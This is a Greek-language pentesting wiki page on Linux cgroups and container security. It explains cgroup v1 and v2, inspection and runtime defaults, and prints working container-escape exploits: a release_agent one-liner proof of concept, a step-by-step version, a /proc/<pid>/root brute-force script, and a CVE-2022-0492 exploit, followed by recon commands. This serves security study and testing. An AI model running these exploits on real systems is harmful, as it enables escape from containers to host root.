# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Τα Linux **control groups** είναι ο μηχανισμός του πυρήνα που χρησιμοποιείται για την ομαδοποίηση διεργασιών για λογιστική, περιορισμό, ιεράρχηση και εφαρμογή πολιτικών. Εάν τα namespaces αφορούν κυρίως στην απομόνωση της όψης των πόρων, τα cgroups αφορούν κυρίως στη ρύθμιση του **πόσο** από αυτούς τους πόρους μπορεί να καταναλώσει ένα σύνολο διεργασιών και, σε ορισμένες περιπτώσεις, **ποιες κατηγορίες πόρων** μπορούν να αλληλεπιδράσουν καθόλου. Containers rely on cgroups constantly, even when the user never looks at them directly, because almost every modern runtime needs a way to tell the πυρήνα "these processes belong to this workload, and these are the resource rules that apply to them".

This is why container engines place a new container into its own cgroup subtree. Μόλις το δέντρο διεργασιών βρίσκεται εκεί, το runtime μπορεί να περιορίσει τη μνήμη, να περιορίσει τον αριθμό των PIDs, να βαρύνει τη χρήση της CPU, να ρυθμίσει το I/O και να περιορίσει την πρόσβαση σε συσκευές. Σε περιβάλλον παραγωγής, αυτό είναι ουσιώδες τόσο για την ασφάλεια multi-tenant όσο και για την απλή λειτουργική καθαριότητα. Ένα container χωρίς ουσιαστικούς ελέγχους πόρων μπορεί να εξαντλήσει τη μνήμη, να πλημμυρίσει το σύστημα με διεργασίες ή να μονοπωλήσει CPU και I/O με τρόπους που καθιστούν τον host ή τα γειτονικά workloads ασταθή.

Από την άποψη της ασφάλειας, τα cgroups έχουν σημασία με δύο ξεχωριστούς τρόπους. Πρώτον, κακοί ή ελλιπείς περιορισμοί πόρων επιτρέπουν απλές denial-of-service επιθέσεις. Δεύτερον, ορισμένα χαρακτηριστικά των cgroup, ειδικά σε παλαιότερες ρυθμίσεις **cgroup v1**, ιστορικά έχουν δημιουργήσει ισχυρά breakout primitives όταν ήταν εγγράψιμα από μέσα σε ένα container.

## v1 Vs v2

Υπάρχουν δύο κύρια μοντέλα cgroup στον χώρο. Το **cgroup v1** εκθέτει πολλαπλές ιεραρχίες controllers, και παλαιότερα exploit writeups συχνά περιστρέφονται γύρω από τις περίεργες και μερικές φορές υπερβολικά ισχυρές σημασιολογίες που υπάρχουν εκεί. Το **cgroup v2** εισάγει μια πιο ενοποιημένη ιεραρχία και γενικά καθαρότερη συμπεριφορά. Οι σύγχρονες διανομές προτιμούν όλο και περισσότερο το cgroup v2, αλλά μικτά ή legacy περιβάλλοντα εξακολουθούν να υπάρχουν, που σημαίνει ότι και τα δύο μοντέλα παραμένουν σχετικά κατά την αξιολόγηση πραγματικών συστημάτων.

Η διαφορά έχει σημασία επειδή μερικές από τις πιο διάσημες ιστορίες breakout από containers, όπως καταχρήσεις του **`release_agent`** στο cgroup v1, συνδέονται πολύ συγκεκριμένα με την παλαιότερη συμπεριφορά των cgroup. Ένας αναγνώστης που βλέπει ένα cgroup exploit σε ένα blog και στη συνέχεια το εφαρμόζει τυφλά σε ένα σύγχρονο σύστημα μόνο με cgroup v2 πιθανότατα θα παρερμηνεύσει τι είναι πραγματικά δυνατό στο στόχο.

## Επιθεώρηση

Ο ταχύτερος τρόπος να δείτε πού βρίσκεται το τρέχον shell σας είναι:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Το αρχείο `/proc/self/cgroup` εμφανίζει τις διαδρομές cgroup που σχετίζονται με τη τρέχουσα διεργασία. Σε έναν σύγχρονο host με cgroup v2, συχνά θα δείτε μια ενιαία εγγραφή. Σε παλαιότερους ή υβριδικούς hosts, μπορεί να δείτε πολλαπλές διαδρομές ελεγκτών v1. Μόλις γνωρίζετε τη διαδρομή, μπορείτε να ελέγξετε τα αντίστοιχα αρχεία κάτω από το `/sys/fs/cgroup` για να δείτε τα όρια και την τρέχουσα χρήση.

Σε host με cgroup v2, οι ακόλουθες εντολές είναι χρήσιμες:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Αυτά τα αρχεία αποκαλύπτουν ποιοι controllers υπάρχουν και ποιοι έχουν ανατεθεί σε child cgroups. Αυτό το μοντέλο ανάθεσης έχει σημασία σε rootless και systemd-managed περιβάλλοντα, όπου το runtime μπορεί να ελέγξει μόνο το υποσύνολο της λειτουργικότητας των cgroup που η γονική ιεραρχία πράγματι αναθέτει.

## Lab

Ένας τρόπος να παρατηρήσετε cgroups στην πράξη είναι να τρέξετε ένα memory-limited container:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Μπορείτε επίσης να δοκιμάσετε ένα PID-limited container:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Αυτά τα παραδείγματα είναι χρήσιμα επειδή βοηθούν να συνδεθεί το runtime flag με το interface αρχείων του kernel. Το runtime δεν επιβάλλει τον κανόνα με μαγεία· γράφει τις σχετικές ρυθμίσεις cgroup και στη συνέχεια αφήνει τον kernel να τις εφαρμόσει στο process tree.

## Χρήση του runtime

Docker, Podman, containerd, και CRI-O βασίζονται όλα σε cgroups ως μέρος της κανονικής λειτουργίας. Οι διαφορές συνήθως δεν αφορούν το αν χρησιμοποιούν cgroups, αλλά σε **ποιες προεπιλογές επιλέγουν**, **πώς αλληλεπιδρούν με systemd**, **πώς λειτουργεί η rootless delegation**, και **πόσο από τη διαμόρφωση ελέγχεται στο επίπεδο του engine έναντι του επιπέδου ορχήστρωσης**.

Στο Kubernetes, τα resource requests και limits τελικά γίνονται cgroup configuration στον κόμβο. Η διαδρομή από το Pod YAML στην επιβολή από τον kernel περνάει μέσω του kubelet, του CRI runtime, και του OCI runtime, αλλά τα cgroups εξακολουθούν να είναι ο μηχανισμός του kernel που τελικά εφαρμόζει τον κανόνα. Σε περιβάλλοντα Incus/LXC, τα cgroups επίσης χρησιμοποιούνται εκτενώς, ειδικά επειδή τα system containers συχνά εκθέτουν ένα πιο πλούσιο process tree και λειτουργικές προσδοκίες πιο όμοιες με VM.

## Λανθασμένες διαμορφώσεις και διαφυγές

Η κλασική ιστορία ασφάλειας των cgroups είναι ο εγγράψιμος μηχανισμός **cgroup v1 `release_agent`**. Σε αυτό το μοντέλο, αν ένας επιτιθέμενος μπορούσε να γράψει στα σωστά αρχεία cgroup, να ενεργοποιήσει το `notify_on_release`, και να ελέγξει τη διαδρομή που αποθηκεύεται στο `release_agent`, ο kernel θα μπορούσε να καταλήξει να εκτελεί μια διαδρομή επιλογής του επιτιθέμενου στα initial namespaces του host όταν το cgroup έγινε κενό. Γι' αυτό παλαιότερα writeups δίνουν τόση προσοχή στην εγγραφιμότητα του controller cgroup, στις mount options, και στις namespace/capability συνθήκες.

Ακόμη και όταν το `release_agent` δεν είναι διαθέσιμο, τα λάθη στα cgroups έχουν σημασία. Υπερβολικά ευρεία device access μπορούν να κάνουν τις συσκευές του host προσβάσιμες από το container. Η απουσία memory και PID limits μπορεί να μετατρέψει μια απλή εκτέλεση κώδικα σε host DoS. Η αδύναμη cgroup delegation σε rootless σενάρια μπορεί επίσης να παραπλανήσει τους αμυντικούς υποθέτοντας ότι υπάρχει περιορισμός ενώ το runtime ποτέ δεν ήταν πραγματικά σε θέση να τον εφαρμόσει.

### `release_agent` Background

Η τεχνική `release_agent` εφαρμόζεται μόνο σε **cgroup v1**. Η βασική ιδέα είναι ότι όταν η τελευταία διεργασία σε ένα cgroup τερματίζει και έχει οριστεί `notify_on_release=1`, ο kernel εκτελεί το πρόγραμμα της διαδρομής που αποθηκεύεται στο `release_agent`. Αυτή η εκτέλεση συμβαίνει στα **initial namespaces του host**, και αυτό είναι που μετατρέπει ένα εγγράψιμο `release_agent` σε primitive διαφυγής από container.

Για να λειτουργήσει η τεχνική, ο επιτιθέμενος γενικά χρειάζεται:

- ένα εγγράψιμο **cgroup v1** ιεραρχία
- τη δυνατότητα να δημιουργήσει ή να χρησιμοποιήσει ένα child cgroup
- τη δυνατότητα να ορίσει το `notify_on_release`
- τη δυνατότητα να γράψει μια διαδρομή στο `release_agent`
- μια διαδρομή που επιλύεται σε εκτελέσιμο από την άποψη του host

### Κλασικό PoC

Το ιστορικό one-liner PoC είναι:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Αυτό το PoC γράφει μια διαδρομή payload στο `release_agent`, ενεργοποιεί την απελευθέρωση του cgroup και στη συνέχεια διαβάζει πίσω το αρχείο εξόδου που δημιουργήθηκε στον host.

### Κατανοητός Οδηγός Βήμα-βήμα

Η ίδια ιδέα είναι πιο κατανοητή όταν διασπαστεί σε βήματα.

1. Δημιουργήστε και προετοιμάστε ένα εγγράψιμο cgroup:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Εντοπίστε τη διαδρομή του host που αντιστοιχεί στο filesystem του container:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Αποθέστε ένα payload που θα είναι ορατό από το host path:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Προκάλεσε την εκτέλεση κάνοντας το cgroup κενό:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Το αποτέλεσμα είναι εκτέλεση στο host της payload με host root privileges. Σε ένα πραγματικό exploit, η payload συνήθως γράφει ένα proof file, ξεκινάει ένα reverse shell ή τροποποιεί την κατάσταση του host.

### Σχετική παραλλαγή μονοπατιού χρησιμοποιώντας `/proc/<pid>/root`

Σε ορισμένα περιβάλλοντα, η host διαδρομή προς το container filesystem δεν είναι προφανής ή κρύβεται από τον storage driver. Σε αυτή την περίπτωση, το payload path μπορεί να εκφραστεί μέσω `/proc/<pid>/root/...`, όπου `<pid>` είναι ένα host PID που ανήκει σε μια διεργασία στο τρέχον container. Αυτή είναι η βάση της relative-path brute-force variant:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Το σχετικό κόλπο εδώ δεν είναι το ίδιο το brute force αλλά η μορφή του path: `/proc/<pid>/root/...` επιτρέπει στον kernel να επιλύσει ένα αρχείο μέσα στο container filesystem από το host namespace, ακόμη και όταν το άμεσο host storage path δεν είναι γνωστό εκ των προτέρων.

### CVE-2022-0492 Παραλλαγή

Το 2022, το CVE-2022-0492 έδειξε ότι η εγγραφή στο `release_agent` σε cgroup v1 δεν έλεγχε σωστά για το `CAP_SYS_ADMIN` στο **αρχικό** user namespace. Αυτό έκανε την τεχνική πολύ πιο προσβάσιμη σε ευάλωτους kernels, επειδή μια container διεργασία που μπορούσε να mount μια cgroup hierarchy μπορούσε να γράψει στο `release_agent` χωρίς να έχει ήδη προνόμια στο host user namespace.

Ελάχιστο exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Σε έναν ευάλωτο kernel, ο host εκτελεί το `/proc/self/exe` με δικαιώματα root του host.

Για πρακτική κατάχρηση, ξεκινήστε ελέγχοντας αν το περιβάλλον εξακολουθεί να εκθέτει εγγράψιμες διαδρομές cgroup-v1 ή επικίνδυνη πρόσβαση σε συσκευές:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Αν το `release_agent` υπάρχει και είναι εγγράψιμο, είστε ήδη σε legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Εάν το ίδιο το cgroup path δεν οδηγεί σε escape, η επόμενη πρακτική χρήση είναι συχνά denial of service ή reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Αυτές οι εντολές σας δείχνουν γρήγορα αν ο φόρτος εργασίας έχει περιθώριο για fork-bomb, να καταναλώσει μνήμη επιθετικά, ή να καταχραστεί μια εγγράψιμη, παλαιού τύπου διεπαφή cgroup.

## Έλεγχοι

Κατά την εξέταση ενός στόχου, ο σκοπός των ελέγχων cgroup είναι να διαπιστώσετε ποιο μοντέλο cgroup χρησιμοποιείται, αν το container βλέπει εγγράψιμες διαδρομές controller, και αν παλιά breakout primitives όπως το `release_agent` έχουν έστω και σχετική σημασία.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Τι είναι ενδιαφέρον εδώ:

- Αν `mount | grep cgroup` δείχνει **cgroup v1**, παλαιότερα breakout writeups αποκτούν μεγαλύτερη σημασία.
- Αν το `release_agent` υπάρχει και είναι προσβάσιμο, αυτό αξίζει άμεση και πιο σε βάθος διερεύνηση.
- Αν η ορατή ιεραρχία cgroup είναι εγγράψιμη και το container επίσης έχει ισχυρές capabilities, το περιβάλλον πρέπει να εξεταστεί πολύ προσεκτικότερα.

Αν ανακαλύψετε **cgroup v1**, writable controller mounts, και ένα container που επίσης έχει ισχυρές capabilities ή αδύναμη προστασία seccomp/AppArmor, ο συνδυασμός αυτός αξίζει προσεκτική προσοχή. Οι cgroups συχνά αντιμετωπίζονται ως ένα βαρετό θέμα resource-management, αλλά ιστορικά έχουν αποτελέσει μέρος μερικών από τις πιο διδακτικές container escape chains, ακριβώς επειδή το όριο ανάμεσα σε "resource control" και "host influence" δεν ήταν πάντα τόσο καθαρό όσο πίστευαν οι άνθρωποι.

## Προεπιλογές runtime

| Runtime / platform | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Κοινή χειροκίνητη αποδυνάμωση |
| --- | --- | --- | --- |
| Docker Engine | Ενεργοποιημένο από προεπιλογή | Τα Containers τοποθετούνται σε cgroups αυτόματα· τα όρια πόρων είναι προαιρετικά εκτός αν οριστούν με flags | omitting `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Ενεργοποιημένο από προεπιλογή | `--cgroups=enabled` είναι το προεπιλεγμένο· οι προεπιλογές του cgroup namespace διαφέρουν ανάλογα με την έκδοση cgroup (`private` σε cgroup v2, `host` σε κάποιες cgroup v1 ρυθμίσεις) | `--cgroups=disabled`, `--cgroupns=host`, χαλαρή πρόσβαση σε συσκευές, `--privileged` |
| Kubernetes | Ενεργοποιημένο μέσω του runtime από προεπιλογή | Τα Pods και τα containers τοποθετούνται σε cgroups από το node runtime· ο λεπτομερής έλεγχος πόρων εξαρτάται από `resources.requests` / `resources.limits` | παράλειψη resource requests/limits, παραχωρημένη (privileged) πρόσβαση σε συσκευές, λανθασμένη διαμόρφωση runtime σε επίπεδο host |
| containerd / CRI-O | Ενεργοποιημένο από προεπιλογή | Οι cgroups είναι μέρος της κανονικής διαχείρισης κύκλου ζωής | άμεσες ρυθμίσεις runtime που χαλαρώνουν τους ελέγχους συσκευών ή εκθέτουν παλαιές (legacy) εγγράψιμες διεπαφές cgroup v1 |

Η σημαντική διάκριση είναι ότι **cgroup existence** είναι συνήθως προεπιλογή, ενώ **useful resource constraints** είναι συχνά προαιρετικά εκτός αν ρυθμιστούν ρητά.
{{#include ../../../../banners/hacktricks-training.md}}
